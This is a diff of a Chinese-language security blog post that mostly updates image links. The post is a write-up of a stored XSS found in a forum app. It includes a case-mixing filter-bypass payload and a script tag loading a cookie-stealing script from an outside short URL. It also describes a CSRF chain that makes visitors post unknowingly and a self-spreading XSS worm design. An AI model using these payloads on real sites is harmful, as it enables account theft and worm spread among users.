@@ -168,54 +168,55 @@
 </blockquote>
 <h3 id="一、存储型XSS"><a href="#一、存储型XSS" class="headerlink" title="一、存储型XSS"></a>一、存储型XSS</h3><p>1、进入发帖处，添加初步测试payload，并查看源码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&lt;script&gt;&lt;SCrIpt&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543478231397.png" alt="1543478231397"></p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543478373880.png" alt="1543478373880"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/1.jpg?raw=true" alt="1.jpg"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/2.jpg?raw=true" alt="2.jpg"></p>
 <p>2、观察到可以大小写混淆绕过，于是构造payload（对于屏蔽括号的可以用 ’ 来代替）：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt&gt;alert&apos;xss&apos;&lt;/sCrIpt&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/3.jpg?raw=true" alt="3.jpg"></p>
 <p>3、刷新页面观察效果，成功弹窗</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543478537190.png" alt="1543478537190"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/4.jpg?raw=true" alt="4.jpg"></p>
 <p>4、插入JS脚本，利用XSS平台窃取用户cookie，这是最常用的XSS利用手法。</p>
 <p>POC：</p>
 <p>&lt;sCRiPt/SrC=//60.wf/m5VP&gt;</p>
 <blockquote>
 <p>SRC引用的是短地址，内容为窃取用户cookie的JS脚本，详细可以使用XSS平台自动生成</p>
 </blockquote>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543478763664.png" alt="1543478763664"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/5.jpg?raw=true" alt="5.jpg"></p>
 <h3 id="二、XSS配合CSRF的初步测验"><a href="#二、XSS配合CSRF的初步测验" class="headerlink" title="二、XSS配合CSRF的初步测验"></a>二、XSS配合CSRF的初步测验</h3><p>1、首先验证是否存在CSRF，同样在发布新贴处，填写标题内容，点击发布抓包</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543479543033.png" alt="1543479543033"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/6.jpg?raw=true" alt="6.jpg"></p>
 <p>2、burp自带的生成CSRF POC，POST包处-》右键-》generate  csrf poc  -》保存-》使用另一个账号发送POC，查看自己的帖子，发现成功发送新帖。</p>
 <p>3、编写JS脚本(可以利用Xss’or来生成)</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543479930565.png" alt="1543479930565"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/7.jpg?raw=true" alt="7.jpg"></p>
 <p>4、CSRF+存储型XSS将脚本插入到页面中</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480043522.png" alt="1543480043522"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/8.jpg?raw=true" alt="8.jpg"></p>
 <p>如图，内容为发布新帖的JS脚本，点击发布，就生成了新帖</p>
 <p>5、浏览此贴，提示成功</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480118230.png" alt="1543480118230"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/9.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/9.jpg"></p>
 <p>6、可以看到成功发布出去</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480167114.png" alt="1543480167114"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/10.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/10.jpg"></p>
 <p>7、使用其他用户浏览帖子测试—-发现同样不知觉的发了个新帖，至此，XSS+CSRF的攻击已经完成</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480208597.png" alt="1543480208597"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/11.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/11.jpg"></p>
 <h3 id="三、蠕虫的构造"><a href="#三、蠕虫的构造" class="headerlink" title="三、蠕虫的构造"></a>三、蠕虫的构造</h3><p>再整理一下思路</p>
 <p>蠕虫的前提是子贴的内容，即点击我们母感染贴的用户所发布的子贴的内容是可控的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、攻击者创建一个攻击帖（母帖），贴中JS脚本包含</span><br><span class="line"></span><br><span class="line">  ①创建一个子回传帖</span><br><span class="line"></span><br><span class="line">  ②子回传帖的内容是重定向到母帖</span><br><span class="line"></span><br><span class="line">2、用户浏览母帖，然后自动创建一个子回传帖。</span><br><span class="line"></span><br><span class="line">3、子回传帖403重定向到母帖</span><br><span class="line"></span><br><span class="line">4、根据内容又创建一个子回传帖</span><br><span class="line"></span><br><span class="line">5、用户之间互相浏览，发散，传播，不拉不拉不拉，造成蠕虫攻击</span><br></pre></td></tr></table></figure>
 <p>1、任意发表新帖</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480504823.png" alt="1543480504823"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/14.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/14.jpg"></p>
 <p>2、记录帖子的URL并点击编辑</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480524237.png" alt="1543480524237"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/15.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/15.jpg"></p>
 <p>3、插入JS脚本，其中控制子回传贴302重定向到母贴的URL</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480568557.png" alt="1543480568557"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/13.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/13.jpg"></p>
 <p>4、发布后浏览，已生成子回传贴</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480625183.png" alt="1543480625183"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/16.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/16.jpg"></p>
 <p>5、打开子回传贴，发现了在母贴JS脚本中构造的框架</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480665119.png" alt="1543480665119"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/17.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/17.jpg"></p>
 <p>6、虽然没有报WAF拦截。但是在FireFox却很遗憾没有成功，打开Network发现了这样一个提示。意为无效的CORS（跨域资源共享）请求。猜测此处应该是属于白名单拦截，限制了JS的入口。</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480684461.png" alt="1543480684461"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/18.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/18.jpg"></p>
 <p>7、通过IE可以运行</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480708858.png" alt="1543480708858"></p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480719389.png" alt="1543480719389"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/19.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/19.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/20.jpg" alt="https://raw.githubusercontent.com/Kaleryou/kaleryou.github.io/master/tupian/20.jpg"></p>
 <p>8、重点！！这些都不是最重要的，因为这是一个APP，所以用户基本上是依赖手机端来运行。之后在手机端上查看帖子成功通过子回传URL重定向到母贴并创建了一个新的子回传贴。虽然 网站可能有WAF， 电脑端IE可以蠕起来，但是发现，app端 没有做任何防护，直接可以传播。</p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480746378.png" alt="1543480746378"></p>
-<p><img src="C:\Users\root\AppData\Roaming\Typora\typora-user-images\1543480758491.png" alt="1543480758491"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/21.png?raw=true" alt="21.png"></p>
+<p><img src="https://github.com/Kaleryou/kaleryou.github.io/blob/master/tupian/22.png?raw=true" alt="22.png"></p>
 
             </div>
 
